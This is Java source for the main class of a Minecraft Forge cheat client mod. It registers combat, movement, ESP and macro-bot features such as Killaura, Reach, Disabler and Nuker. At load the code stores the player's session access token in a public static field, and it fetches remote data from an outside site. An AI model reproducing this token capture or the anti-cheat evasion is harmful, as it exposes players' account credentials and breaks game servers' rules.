package com.suyako;

import com.suyako.lazyQoL.common.EventLoader;
import com.suyako.lazyQoL.common.Via;
import com.suyako.lazyQoL.common.command.CommandManager;
import com.suyako.lazyQoL.common.command.DevCommand;
import com.suyako.lazyQoL.common.function.*;
import com.suyako.lazyQoL.common.function.rank.CustomRank;
import com.suyako.lazyQoL.common.function.rank.RankList;
import com.suyako.lazyQoL.common.function.title.TitleManager;
import com.suyako.lazyQoL.common.key.KeyLoader;
import com.suyako.lazyQoL.core.*;
import com.suyako.lazyQoL.core.FunctionManager.FunctionManager;
import com.suyako.lazyQoL.core.Pathfinding;
import com.suyako.lazyQoL.core.config.ConfigLoader;
import com.suyako.lazyQoL.core.config.EtherwarpWaypoints;
import com.suyako.lazyQoL.core.config.getConfigByFunctionName;
import com.suyako.lazyQoL.core.event.CustomEventHandler;
/*import com.suyako.lazyQoL.core.mcef.client.ClientProxy;
import com.suyako.lazyQoL.core.mcef.utilities.Log;*/
import com.suyako.lazyQoL.core.notice.NoticeManager;
import com.suyako.lazyQoL.core.register.LazyQoLRegister;
import com.suyako.lazyQoL.core.settings.*;
import com.suyako.lazyQoL.core.type.LazyQoLFunction;
import com.suyako.lazyQoL.core.type.SelectObject;
import com.suyako.lazyQoL.core.type.SelectTable;
import com.suyako.lazyQoL.develop.Console;
import com.suyako.lazyQoL.utils.Blur;
import com.suyako.lazyQoL.utils.Chroma;
import com.suyako.lazyQoL.utils.SmoothRotation;
import com.suyako.lazyQoL.utils.Utils;
import com.suyako.lazyQoL.utils.packet.PacketEvent;
import io.netty.channel.EventLoop;
import net.minecraft.client.Minecraft;
import net.minecraftforge.client.ClientCommandHandler;
import net.minecraftforge.common.MinecraftForge;
import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.fml.common.Mod.EventHandler;
import net.minecraftforge.fml.common.Mod.Instance;
import net.minecraftforge.fml.common.event.FMLInitializationEvent;
import net.minecraftforge.fml.common.event.FMLPostInitializationEvent;
import net.minecraftforge.fml.common.event.FMLPreInitializationEvent;

//import static com.suyako.lazyQoL.core.mcef.MCEF.*;

import java.awt.*;
import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.HashMap;
import java.util.concurrent.CompletableFuture;
import java.util.concurrent.ExecutorService;
import java.util.logging.Logger;


@Mod(modid = LazyQoL.MODID, name = LazyQoL.NAME, version = LazyQoL.VERSION, acceptedMinecraftVersions = "1.8.9", clientSideOnly = true)
public class LazyQoL {
    //set up basic mod information
    public static final String MODID = "lazyqol";
    public static final String NAME = "LazyQoL-Client";
    public static final String VERSION = "2.1.7";
    private static final String Sb = "Sb";
    public static String SuyakoUserName = "";
    public static String lastLoginAccessToken = Minecraft.getMinecraft().getSession().getToken();

    @Deprecated
    public static float strafe;
    @Deprecated
    public static float forward;
    @Deprecated
    public static float friction;

    //init Pathfinder KeyMap in Utils
    Utils utils = new Utils();

    //storage autofish yaw state
    public static boolean AutoFishYawState = false;
    //huge screenshot scaling
    public static int ImageScaling = 1;
    //remove bossbar when function enable/disable notice is visible
    public static boolean shouldRenderBossBar = true;
    //lazyQoL basic hud style color
    public static int Color = 16542622;
    //lazyQoL directory in .minecraft
    public static File LazyQoLDirectory = new File(System.getProperty("user.dir") + "\\LazyQoL\\");
    //current hud list storage
    public static String PresentGUI = "root";
    //selected function in hud storage
    public static String PresentFunction = "";
    //decorate at ground storage
    public static HashMap<String, String> GroundDecorateList = new HashMap<String, String>();
    //use for viaversion
    public static int versionIndex = 0;
    @Deprecated
    //check is labymod istalled
    public static Boolean LabymodInstallCheck;
    //disable sapling collision
    public static Boolean NoSaplingBound = false;
    //disable log block collision
    public static Boolean NoTreeBound = false;

    //lazyQoL function keybind storage
    public static HashMap<LazyQoLFunction,Integer> KeyBinding = new HashMap<LazyQoLFunction, Integer>();

    @Deprecated
    @Instance(LazyQoL.MODID)
    public static LazyQoL instance;

    //@SidedProxy(serverSide = "com.suyako.lazyQoL.core.mcef.BaseProxy", clientSide = "com.suyako.lazyQoL.core.mcef.client.ClientProxy")
    /*public static ClientProxy PROXY = new ClientProxy();*/

    //use for viaversion
    public static void start() {
        Via.getInstance().start();
    }
    public static Logger getjLogger() {
        return Via.getInstance().getjLogger();
    }

    public static CompletableFuture<Void> getInitFuture() {
        return Via.getInstance().getInitFuture();
    }

    public static ExecutorService getAsyncExecutor() {
        return Via.getInstance().getAsyncExecutor();
    }

    public static EventLoop getEventLoop() {
        return Via.getInstance().getEventLoop();
    }

    public static File getFile() {
        return Via.getInstance().getFile();
    }

    public static String getLastServer() {
        return Via.getInstance().getLastServer();
    }

    public static int getVersion() {
        return Via.getInstance().getVersion();
    }

    public static void setVersion(int version) {
        Via.getInstance().setVersion(version);
    }

    public static void setFile(File file) {
        Via.getInstance().setFile(file);
    }

    public static void setLastServer(String lastServer) {
        Via.getInstance().setLastServer(lastServer);
    }

    @EventHandler
    public void preInit(FMLPreInitializationEvent event) throws IOException {
        // TODO
        //register config
        new com.suyako.lazyQoL.core.config.ConfigLoader(event);
        new EtherwarpWaypoints(event);
        //init function config manager
        new getConfigByFunctionName();
        EtherwarpTeleport ether = new EtherwarpTeleport();
        MinecraftForge.EVENT_BUS.register(ether);
        CustomEventHandler.EVENT_BUS.register(ether);

        /*Log.info("Loading MCEF config...");
        Configuration cfg = new Configuration(new File(LazyQoL.LazyQoLDirectory,"mcef_config.cfg"));

        //Config: main
        SKIP_UPDATES        = cfg.getBoolean("skipUpdates"      , "main", false          , "Do not update binaries.");
        WARN_UPDATES        = cfg.getBoolean("warnUpdates"      , "main", true           , "Tells in the chat if a new version of MCEF is available.");
        USE_FORGE_SPLASH    = cfg.getBoolean("useForgeSplash"   , "main", true           , "Use Forge's splash screen to display resource download progress (may be unstable).");
        CEF_ARGS            = cfg.getString ("cefArgs"          , "main", "--disable-gpu", "Command line arguments passed to CEF. For advanced users.").split("\\s+");
        SHUTDOWN_JCEF       = cfg.getBoolean("shutdownJcef"     , "main", false          , "Set this to true if your Java process hangs after closing Minecraft. This is disabled by default because it makes the launcher think Minecraft crashed...");
        SECURE_MIRRORS_ONLY = cfg.getBoolean("secureMirrorsOnly", "main", true           , "Only enable secure (HTTPS) mirror. This should be kept to true unless you know what you're doing.");

        String mirror = cfg.getString("forcedMirror", "main", "", "A URL that contains every MCEF resources; for instance https://montoyo.net/jcef.").trim();
        if(mirror.length() > 0)
            FORCE_MIRROR = mirror;

        //Config: exampleBrowser
        ENABLE_EXAMPLE = cfg.getBoolean("enable", "exampleBrowser", true                  , "Set this to false if you don't want to enable the F10 browser.");
        HOME_PAGE      = cfg.getString ("home"  , "exampleBrowser", "bing.com", "The home page of the F10 browser.");

        //Config: debug
        CHECK_VRAM_LEAK = cfg.getBoolean("checkForVRAMLeak", "debug", false, "Track allocated OpenGL textures to make sure there's no leak");
        cfg.save();

        importLetsEncryptCertificate();
        PROXY.onPreInit();*/
    }

    @EventHandler
    public void init(FMLInitializationEvent event) throws AWTException {

        //PROXY.onInit();
        // TODO
        //init general event loader
        new EventLoader();
        //register keys
        new KeyLoader();

        //if lazyQoL directory doesn't exist,then create one
        if (!LazyQoLDirectory.exists()) {
            LazyQoLDirectory.mkdir();
        }
        //register genral command
        ClientCommandHandler.instance.registerCommand(new CommandManager());
        //register develop command
        ClientCommandHandler.instance.registerCommand(new DevCommand());
        //check labymod
        LabymodInstallCheck = utils.ModLoadCheck("labymod");

        //reset gamma for FullBright
        if (Minecraft.getMinecraft().gameSettings.gammaSetting > 1) {
            Minecraft.getMinecraft().gameSettings.gammaSetting = 0;
        }

        //init GroundDecorate
        try {
            String content = "";
            URL url = new URL("https://okman.com");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestProperty("User-Agent", "Mozilla/4.0 (compatible; MSIE 5.0; Windows NT; DigExt)");
            BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream(), "utf-8"));
            String input;
            while ((input = reader.readLine()) != null) {
                content += input;
            }
            reader.close();
            GroundDecorateList.clear();
            for (String str : content.split(";")) {
                GroundDecorateList.put(str.split(",")[0], str.split(",")[1]);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        //init CustomItemName
        try {
            String content = "";
            URL url = new URL("https://okman.com");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestProperty("User-Agent", "Mozilla/4.0 (compatible; MSIE 5.0; Windows NT; DigExt)");
            BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream(), "utf-8"));
            String input;
            while ((input = reader.readLine()) != null) {
                content += input;
            }
            reader.close();
            CustomItemName.CustomName.clear();
            for (String str : content.split(";")) {
                CustomItemName.CustomName.put(str.split(",")[0], str.split(",")[1]);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        //init UserName
        try {
            String content = "";
            URL url = new URL("https://okman.com");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestProperty("User-Agent", "Mozilla");
            BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream(), "utf-8"));
            String input;
            while ((input = reader.readLine()) != null) {
                content += input;
            }
            reader.close();
            SuyakoUserName = content;
        } catch (Exception e) {
            e.printStackTrace();
        }

        //register events in Utils
        CustomEventHandler.EVENT_BUS.register(new Utils());

        //init console gui
        Console.init();


        //init miscellaneous class and register miscellaneous event
        new Chroma();
        //new CustomEventHandler.ClientTickEndEvent();
        new HUDManager();
        new Pathfinding();
        new nukerCore();
        new nukerWrapper();
        new DanmakuCore();
        new SmoothRotation();
        new PacketEvent();
        new NoticeManager();




        //init functions and register function event
        new AutoFish();
        new AutoKillWorm();
        new WormLavaESP();
        new SilverfishESP();
        new GolemESP();
        new GuardianESP();
        new GemstoneHidePane();
        new FullBright();
        new StarredMobESP();
        new DungeonKeyESP();
        new CustomPetName();
        new LanternESP();
        new TitleManager();
        new AntiAFK();
        new Sprint();
        new Eagle();
        new Velocity();
        new GhostBlock();
        new InstantSwitch();
        new AutoClicker();
        new TerminalESP();
        new HideDungeonMobNameTag();
        new PlayerFinder();
        new SecretBot();
        new AutoCannon();
        new DroppedItemESP();
        new MouseISwitch();
        new Killaura();
        new AutoUse();
        new HollowAutoPurchase();
        new WTap();
        new FreeCamera();
        new TargetESP();
        new Cartoon();
        new Interface();
        new ShortBowAura();
        new HideFallingBlock();
        new AutoWolfSlayer();
        new ChestFinder();
        new AutoLeave();
        new CropBot();
        new MarketingGenerator();
        new PeltESP();
        new ForagingBot();
        new JasperESP();
        new SynthesizerAura();
        new Nuker();
        new FrozenTreasureESP();
        new CaveSpiderESP();
        new KillerBot();
        new AutoTerminal();
        new DragonEggESP();
        new DanmakuChat();
        new PowderBot();
        new FrozenTreasureBot();
        new SapphireGrottoESP();
        new FPSAccelerator();
        new Disabler();
        new Timer();
        new MacroerDetector();
        new RainbowEntity();
        new AutoArmadillo();
        new BHop();
        new AutoTool();
        new AutoWeapon();
        new BlockTarget();
        new ChatDetector();
        new FrozenScytheAura();
        new JadeCrystalBot();
        //new WebBrowser();
        new HarpBot();
        new ExperimentsBot();
        new GemstoneBot();
        new AutoSS();
        new GiftRecipient();

        //init blur
        Blur.register();

        //register decorate events
        new com.suyako.lazyQoL.common.decorate.Events();

        //some rank thing
        new RankList();
        new CustomRank();

        //register functions
        LazyQoLRegister register = new LazyQoLRegister();
        register.RegisterFunction(new LazyQoLFunction("AutoClicker"));
        register.RegisterFunction(new LazyQoLFunction("Killaura"));
        register.RegisterFunction(new LazyQoLFunction("Reach"));
        register.RegisterFunction(new LazyQoLFunction("WTap"));
        register.RegisterFunction(new LazyQoLFunction("FreeCamera"));
        register.RegisterFunction(new LazyQoLFunction("TargetESP"));
        register.RegisterFunction(new LazyQoLFunction("WormLavaESP"));
        register.RegisterFunction(new LazyQoLFunction("LanternESP"));
        register.RegisterFunction(new LazyQoLFunction("SilverfishESP"));
        register.RegisterFunction(new LazyQoLFunction("GolemESP"));
        register.RegisterFunction(new LazyQoLFunction("GuardianESP"));
        register.RegisterFunction(new LazyQoLFunction("AutoFish"));
        register.RegisterFunction(new LazyQoLFunction("AutoKillWorm"));
        register.RegisterFunction(new LazyQoLFunction("GemstoneHidePane"));
        register.RegisterFunction(new LazyQoLFunction("FullBright"));
        register.RegisterFunction(new LazyQoLFunction("StarredMobESP"));
        register.RegisterFunction(new LazyQoLFunction("DungeonKeyESP"));
        register.RegisterFunction(new LazyQoLFunction("CustomPetNameTag"));
        register.RegisterFunction(new LazyQoLFunction("AntiAFK"));
        register.RegisterFunction(new LazyQoLFunction("Sprint"));
        register.RegisterFunction(new LazyQoLFunction("Eagle"));
        register.RegisterFunction(new LazyQoLFunction("Velocity"));
        register.RegisterFunction(new LazyQoLFunction("AutoCannon"));
        register.RegisterFunction(new LazyQoLFunction("HUD"));
        register.RegisterFunction(new LazyQoLFunction("GhostBlock"));
        register.RegisterFunction(new LazyQoLFunction("InstantSwitch"));
        register.RegisterFunction(new LazyQoLFunction("NoSlow"));
        register.RegisterFunction(new LazyQoLFunction("TerminalESP"));
        register.RegisterFunction(new LazyQoLFunction("HideDungeonMobNameTag"));
        register.RegisterFunction(new LazyQoLFunction("PlayerFinder"));
        register.RegisterFunction(new LazyQoLFunction("SecretBot"));
        register.RegisterFunction(new LazyQoLFunction("DroppedItemESP"));
        register.RegisterFunction(new LazyQoLFunction("MouseISwitch"));
        register.RegisterFunction(new LazyQoLFunction("AutoUse"));
        register.RegisterFunction(new LazyQoLFunction("Cartoon"));
        register.RegisterFunction(new LazyQoLFunction("HollowAutoPurchase"));
        register.RegisterFunction(new LazyQoLFunction("Interface"));
        register.RegisterFunction(new LazyQoLFunction("ShortBowAura"));
        register.RegisterFunction(new LazyQoLFunction("HideFallingBlock"));
        register.RegisterFunction(new LazyQoLFunction("Pathfinding"));
        register.RegisterFunction(new LazyQoLFunction("AutoWolfSlayer"));
        register.RegisterFunction(new LazyQoLFunction("ChestFinder"));
        register.RegisterFunction(new LazyQoLFunction("AutoLeave"));
        register.RegisterFunction(new LazyQoLFunction("CropBot"));
        register.RegisterFunction(new LazyQoLFunction("MarketingGenerator"));
        register.RegisterFunction(new LazyQoLFunction("PeltESP"));
        register.RegisterFunction(new LazyQoLFunction("ForagingBot"));
        register.RegisterFunction(new LazyQoLFunction("JasperESP"));
        register.RegisterFunction(new LazyQoLFunction("SynthesizerAura"));
        register.RegisterFunction(new LazyQoLFunction("Nuker"));
        register.RegisterFunction(new LazyQoLFunction("NukerWrapper"));
        register.RegisterFunction(new LazyQoLFunction("FrozenTreasureESP"));
        register.RegisterFunction(new LazyQoLFunction("CaveSpiderESP"));
        register.RegisterFunction(new LazyQoLFunction("KillerBot"));
        register.RegisterFunction(new LazyQoLFunction("AutoTerminal"));
        register.RegisterFunction(new LazyQoLFunction("NickHider"));
        register.RegisterFunction(new LazyQoLFunction("DragonEggESP"));
        register.RegisterFunction(new LazyQoLFunction("DanmakuChat"));
        register.RegisterFunction(new LazyQoLFunction("PowderBot"));
        register.RegisterFunction(new LazyQoLFunction("FrozenTreasureBot"));
        register.RegisterFunction(new LazyQoLFunction("SapphireGrottoESP"));
        register.RegisterFunction(new LazyQoLFunction("FPS Accelerator"));
        register.RegisterFunction(new LazyQoLFunction("Disabler"));
        register.RegisterFunction(new LazyQoLFunction("Timer"));
        register.RegisterFunction(new LazyQoLFunction("MacroerDetector"));
        register.RegisterFunction(new LazyQoLFunction("Camera"));
        register.RegisterFunction(new LazyQoLFunction("RainbowEntity"));
        register.RegisterFunction(new LazyQoLFunction("AutoArmadillo"));
        register.RegisterFunction(new LazyQoLFunction("BHop"));
        register.RegisterFunction(new LazyQoLFunction("AutoTool"));
        register.RegisterFunction(new LazyQoLFunction("AutoWeapon"));
        register.RegisterFunction(new LazyQoLFunction("BlockTarget"));
        register.RegisterFunction(new LazyQoLFunction("ChatDetector"));
        register.RegisterFunction(new LazyQoLFunction("FrozenScytheAura"));
        register.RegisterFunction(new LazyQoLFunction("JadeCrystalBot"));
        //register.RegisterFunction(new LazyQoLFunction("WebBrowser"));
        register.RegisterFunction(new LazyQoLFunction("HarpBot"));
        register.RegisterFunction(new LazyQoLFunction("ExperimentsBot"));
        register.RegisterFunction(new LazyQoLFunction("InputFix"));
        register.RegisterFunction(new LazyQoLFunction("GemstoneBot"));
        register.RegisterFunction(new LazyQoLFunction("Giant"));
        register.RegisterFunction(new LazyQoLFunction("AutoSS"));
        register.RegisterFunction(new LazyQoLFunction("GiftRecipient"));


        //register tables
        register.RegisterTable(new SelectTable("root"));
        register.RegisterTable(new SelectTable("Combat"));
        register.RegisterTable(new SelectTable("Render"));
        register.RegisterTable(new SelectTable("Player"));
        register.RegisterTable(new SelectTable("Dungeon"));
        register.RegisterTable(new SelectTable("Macro"));
        register.RegisterTable(new SelectTable("CrystalHollow"));
        register.RegisterTable(new SelectTable("Movement"));
        register.RegisterTable(new SelectTable("Misc"));
        register.RegisterTable(new SelectTable("Fun"));

        //register select objects (add a select objects)
        //SelectObjects first argument is it type,table is SelectTable,is an openable classification,Some function are included inside
        //function is LazyQoLFunction,These functions will appear in the table and can be turned on and off from here
        //second argument is name,These names will be seen by the user
        //third argument is parent table's name,The outermost table is called root
        register.RegisterSelectObject(new SelectObject("table", "Combat", "root"));
        register.RegisterSelectObject(new SelectObject("table", "Render", "root"));
        register.RegisterSelectObject(new SelectObject("table", "Player", "root"));
        register.RegisterSelectObject(new SelectObject("table", "Dungeon", "root"));
        register.RegisterSelectObject(new SelectObject("table", "Macro", "root"));
        register.RegisterSelectObject(new SelectObject("table", "CrystalHollow", "root"));
        register.RegisterSelectObject(new SelectObject("table", "Movement", "root"));
        register.RegisterSelectObject(new SelectObject("table", "Misc", "root"));
        register.RegisterSelectObject(new SelectObject("table", "Fun", "root"));

        register.RegisterSelectObject(new SelectObject("function", "AutoClicker", "Combat"));
        register.RegisterSelectObject(new SelectObject("function", "AutoCannon", "Combat"));
        register.RegisterSelectObject(new SelectObject("function", "TargetESP", "Combat"));
        register.RegisterSelectObject(new SelectObject("function", "NoSlow", "Combat"));
        register.RegisterSelectObject(new SelectObject("function", "Killaura", "Combat"));
        register.RegisterSelectObject(new SelectObject("function", "ShortBowAura", "Combat"));
        register.RegisterSelectObject(new SelectObject("function", "FrozenScytheAura", "Combat"));
        register.RegisterSelectObject(new SelectObject("function", "Reach", "Combat"));
        register.RegisterSelectObject(new SelectObject("function", "WTap", "Combat"));

        register.RegisterSelectObject(new SelectObject("function", "SilverfishESP", "Render"));
        register.RegisterSelectObject(new SelectObject("function", "GuardianESP", "Render"));
        register.RegisterSelectObject(new SelectObject("function", "GolemESP", "Render"));
        register.RegisterSelectObject(new SelectObject("function", "CaveSpiderESP", "Render"));
        register.RegisterSelectObject(new SelectObject("function", "LanternESP", "Render"));
        register.RegisterSelectObject(new SelectObject("function", "PlayerFinder", "Render"));
        register.RegisterSelectObject(new SelectObject("function", "FullBright", "Render"));
        register.RegisterSelectObject(new SelectObject("function", "DroppedItemESP", "Render"));
        register.RegisterSelectObject(new SelectObject("function", "PeltESP", "Render"));
        register.RegisterSelectObject(new SelectObject("function", "Camera", "Render"));
        register.RegisterSelectObject(new SelectObject("function", "HideFallingBlock", "Render"));
        register.RegisterSelectObject(new SelectObject("function", "JasperESP", "Render"));
        register.RegisterSelectObject(new SelectObject("function", "FrozenTreasureESP", "Render"));
        register.RegisterSelectObject(new SelectObject("function", "DragonEggESP", "Render"));
        register.RegisterSelectObject(new SelectObject("function", "ChestFinder", "Render"));
        register.RegisterSelectObject(new SelectObject("function", "FreeCamera", "Render"));
        register.RegisterSelectObject(new SelectObject("function", "FPS Accelerator","Render"));

        register.RegisterSelectObject(new SelectObject("function", "AutoTool","Player"));
        register.RegisterSelectObject(new SelectObject("function", "AutoWeapon","Player"));
        register.RegisterSelectObject(new SelectObject("function", "AutoUse", "Player"));
        register.RegisterSelectObject(new SelectObject("function", "BlockTarget", "Player"));
        register.RegisterSelectObject(new SelectObject("function", "ChatDetector", "Player"));
        register.RegisterSelectObject(new SelectObject("function", "NickHider", "Player"));

        register.RegisterSelectObject(new SelectObject("function", "StarredMobESP", "Dungeon"));
        register.RegisterSelectObject(new SelectObject("function", "DungeonKeyESP", "Dungeon"));
        register.RegisterSelectObject(new SelectObject("function", "TerminalESP", "Dungeon"));
        register.RegisterSelectObject(new SelectObject("function", "HideDungeonMobNameTag", "Dungeon"));
        register.RegisterSelectObject(new SelectObject("function", "SecretBot", "Dungeon"));
        register.RegisterSelectObject(new SelectObject("function", "GhostBlock", "Dungeon"));
        register.RegisterSelectObject(new SelectObject("function", "AutoTerminal", "Dungeon"));
        register.RegisterSelectObject(new SelectObject("function", "AutoSS", "Dungeon"));

        register.RegisterSelectObject(new SelectObject("function", "AutoFish", "Macro"));
        register.RegisterSelectObject(new SelectObject("function", "AutoKillWorm", "Macro"));
        register.RegisterSelectObject(new SelectObject("function", "AutoLeave", "Macro"));
        register.RegisterSelectObject(new SelectObject("function", "AutoWolfSlayer", "Macro"));
        register.RegisterSelectObject(new SelectObject("function", "CropBot", "Macro"));
        register.RegisterSelectObject(new SelectObject("function", "ForagingBot", "Macro"));
        register.RegisterSelectObject(new SelectObject("function", "KillerBot", "Macro"));
        register.RegisterSelectObject(new SelectObject("function", "SynthesizerAura", "Macro"));
        register.RegisterSelectObject(new SelectObject("function", "Nuker", "Macro"));
        register.RegisterSelectObject(new SelectObject("function", "GiftRecipient", "Macro"));
        register.RegisterSelectObject(new SelectObject("function", "HarpBot", "Macro"));
        register.RegisterSelectObject(new SelectObject("function", "ExperimentsBot", "Macro"));
        register.RegisterSelectObject(new SelectObject("function", "PowderBot", "Macro"));
        register.RegisterSelectObject(new SelectObject("function", "FrozenTreasureBot", "Macro"));

        register.RegisterSelectObject(new SelectObject("function", "GemstoneHidePane", "CrystalHollow"));
        register.RegisterSelectObject(new SelectObject("function", "HollowAutoPurchase", "CrystalHollow"));
        register.RegisterSelectObject(new SelectObject("function", "JadeCrystalBot", "CrystalHollow"));
        register.RegisterSelectObject(new SelectObject("function", "AutoArmadillo", "CrystalHollow"));
        register.RegisterSelectObject(new SelectObject("function", "GemstoneBot", "CrystalHollow"));
        register.RegisterSelectObject(new SelectObject("function", "SapphireGrottoESP", "CrystalHollow"));
        register.RegisterSelectObject(new SelectObject("function", "WormLavaESP", "CrystalHollow"));

        register.RegisterSelectObject(new SelectObject("function", "AntiAFK", "Movement"));
        register.RegisterSelectObject(new SelectObject("function", "Sprint", "Movement"));
        register.RegisterSelectObject(new SelectObject("function", "Eagle", "Movement"));
        register.RegisterSelectObject(new SelectObject("function", "Velocity", "Movement"));
        register.RegisterSelectObject(new SelectObject("function", "BHop", "Movement"));
        register.RegisterSelectObject(new SelectObject("function", "Timer", "Movement"));

        register.RegisterSelectObject(new SelectObject("function", "InstantSwitch", "Misc"));
        register.RegisterSelectObject(new SelectObject("function", "MouseISwitch", "Misc"));
        register.RegisterSelectObject(new SelectObject("function", "Interface", "Misc"));
        register.RegisterSelectObject(new SelectObject("function", "InputFix", "Misc"));
        register.RegisterSelectObject(new SelectObject("function", "Disabler", "Misc"));
        register.RegisterSelectObject(new SelectObject("function", "HUD", "Misc"));

        register.RegisterSelectObject(new SelectObject("function", "CustomPetNameTag", "Fun"));
        //register.RegisterSelectObject(new SelectObject("function", "WebBrowser", "Fun"));
        register.RegisterSelectObject(new SelectObject("function", "Cartoon", "Fun"));
        register.RegisterSelectObject(new SelectObject("function", "MarketingGenerator", "Fun"));
        register.RegisterSelectObject(new SelectObject("function", "DanmakuChat", "Fun"));
        register.RegisterSelectObject(new SelectObject("function", "MacroerDetector", "Fun"));
        register.RegisterSelectObject(new SelectObject("function", "RainbowEntity", "Fun"));
        register.RegisterSelectObject(new SelectObject("function", "Giant", "Fun"));

        //Rearrange the function arrays to make them look more aesthetically pleasing
        LazyQoLRegister.ReList();

        //Re-enable the last turned on function
        ConfigLoader.applyFunctionState();

        //Manage certain functions that need to be turned on or off at startup
        FunctionManager.setStatus("CustomPetNameTag", false);
        FunctionManager.setStatus("Pathfinding", false);
        FunctionManager.setStatus("Interface", true);
        nukerWrapper.disable();

        //FunctionManage.bindFunction is bind a function to function manage
        //addConfiguration is to apply the configuration to the currently bind function
        FunctionManager.bindFunction("Killaura");
        FunctionManager.addConfiguration(new SettingLimitDouble("CPS", "cps", 5.0D,18.0D,1.0D));
        HashMap<String, Integer> KillauraTypeMap = new HashMap<String, Integer>();
        KillauraTypeMap.put("Single",0);
        KillauraTypeMap.put("Switch",1);
        FunctionManager.addConfiguration(new SettingTypeSelector("mode","mode",0,KillauraTypeMap));
        FunctionManager.addConfiguration(new SettingLimitDouble("Switch mode delay", "switchDelay", 400.0D,1000.0D,50.0D));
        FunctionManager.addConfiguration(new SettingLimitDouble("wall attack range", "wallRange", 3.5D,7.0D,1.0D));
        FunctionManager.addConfiguration(new SettingBoolean("attack players", "isAttackPlayer", true));
        FunctionManager.addConfiguration(new SettingBoolean("target EPS", "targetESP", true));
        FunctionManager.addConfiguration(new SettingLimitDouble("max pitch range", "maxPitch", 180.0D,180.0D,1.0D));
        FunctionManager.addConfiguration(new SettingLimitDouble("max yaw range", "maxYaw", 180.0D,180.0D,1.0D));
        FunctionManager.addConfiguration(new SettingLimitDouble("max rotation range", "maxRotationRange", 6.0D,12.0D,2.0D));
        FunctionManager.addConfiguration(new SettingLimitDouble("FOV", "Fov", 270.0D,360.0D,90.0D));
        FunctionManager.addConfiguration(new SettingLimitInt("rotation smooth", "smooth", 60,100,1));
        FunctionManager.addConfiguration(new SettingBoolean("attack NPC", "isAttackNPC", false));
        FunctionManager.addConfiguration(new SettingBoolean("attack team member", "isAttackTeamMember", false));
        FunctionManager.addConfiguration(new SettingBoolean("only sword", "onlySword", false));
        FunctionManager.addConfiguration(new SettingBoolean("auto block", "autoBlock", false));
        FunctionManager.addConfiguration(new SettingLimitDouble("block range", "blockRange", 3.5D,10.0D,1.0D));
        FunctionManager.addConfiguration(new SettingBoolean("LagCheck", "lagCheck", false));

        FunctionManager.bindFunction("InstantSwitch");
        FunctionManager.addConfiguration(new SettingString("item name", "itemName", "of the End"));
        FunctionManager.addConfiguration(new SettingBoolean("left click mode", "leftClick", false));

        FunctionManager.bindFunction("AutoUse");
        FunctionManager.addConfiguration(new SettingLimitInt("cooldown","cooldown",10,Integer.MAX_VALUE,0));
        FunctionManager.addConfiguration(new SettingString("item name(no need to use full name)","itemName","of the End"));
        FunctionManager.addConfiguration(new SettingInt("timer pos(X)", "timerX", 200));
        FunctionManager.addConfiguration(new SettingInt("timer pos(Y)", "timerY", 130));

        FunctionManager.bindFunction("Reach");
        FunctionManager.addConfiguration(new SettingLimitDouble("distance","distance",3.0D,4.0D,3.0D));

        FunctionManager.bindFunction("AutoFish");
        FunctionManager.addConfiguration(new SettingBoolean("SlugFish mode", "slug", false));
        FunctionManager.addConfiguration(new SettingBoolean("status message", "message", true));
        FunctionManager.addConfiguration(new SettingBoolean("throw timer", "timer", true));
        FunctionManager.addConfiguration(new SettingBoolean("force sneak", "sneak", false));
        FunctionManager.addConfiguration(new SettingBoolean("auto throw hook", "throwHook", true));
        FunctionManager.addConfiguration(new SettingInt("auto throw hook timeout(s)","throwHookCooldown",5));
        FunctionManager.addConfiguration(new SettingBoolean("long time rethrow", "rethrow", true));
        FunctionManager.addConfiguration(new SettingLimitInt("rethrow timeout(s)","rethrowCooldown",20,30,1));
        FunctionManager.addConfiguration(new SettingInt("rethrow timer pos(X)", "timerX", 200));
        FunctionManager.addConfiguration(new SettingInt("rethrow timer pos(Y)", "timerY", 100));

        FunctionManager.bindFunction("WTap");
        FunctionManager.addConfiguration(new SettingBoolean("bow mode", "bowMode", true));

        HashMap<String, Integer> HUDTypeMap = new HashMap<String, Integer>();
        HUDTypeMap.put("Classic",0);
        HUDTypeMap.put("White",1);
        HUDTypeMap.put("Transparent",2);
        HUDTypeMap.put("QSF",3);
        HashMap<String, Integer> HUDHideMap = new HashMap<String, Integer>();
        HUDHideMap.put("Left",0);
        HUDHideMap.put("Right",1);
        HUDHideMap.put("Both",2);
        FunctionManager.bindFunction("HUD");
        FunctionManager.addConfiguration(new SettingInt("left pos","HUDHeight",0));
        FunctionManager.addConfiguration(new SettingInt("right pos","FunctionListHeight",0));
        FunctionManager.addConfiguration(new SettingTypeSelector("HUD style","style",3,HUDTypeMap));
        FunctionManager.addConfiguration(new SettingTypeSelector("HUD hide part","hide",2,HUDHideMap));

        FunctionManager.bindFunction("CustomPetNameTag");
        FunctionManager.addConfiguration(new SettingString("\"char=replace char\",split multi rules with\",\", clear rules with \"null\"", "petName", "null"));
        FunctionManager.addConfiguration(new SettingInt("pet level, disable custom level with0","petLevel",0));

        FunctionManager.bindFunction("MouseISwitch");
        FunctionManager.addConfiguration(new SettingString("item name", "itemName", "Shadow Fu"));
        FunctionManager.addConfiguration(new SettingBoolean("left key trigger", "leftTrigger", true));

        FunctionManager.bindFunction("AutoKillWorm");
        FunctionManager.addConfiguration(new SettingLimitInt("cooldown","cooldown",300,Integer.MAX_VALUE,0));
        FunctionManager.addConfiguration(new SettingBoolean("aim worm", "aim", false));
        FunctionManager.addConfiguration(new SettingString("rightkey tiem name", "itemName", "staff of the vol"));
        FunctionManager.addConfiguration(new SettingInt("rightkey time", "rcCount", 1));
        FunctionManager.addConfiguration(new SettingInt("rightkey cooldown(tick)", "rcCooldown", 10));
        FunctionManager.addConfiguration(new SettingInt("timer pos(X)", "timerX", 200));
        FunctionManager.addConfiguration(new SettingInt("timer pos(Y)", "timerY", 115));

        FunctionManager.bindFunction("NoSlow");
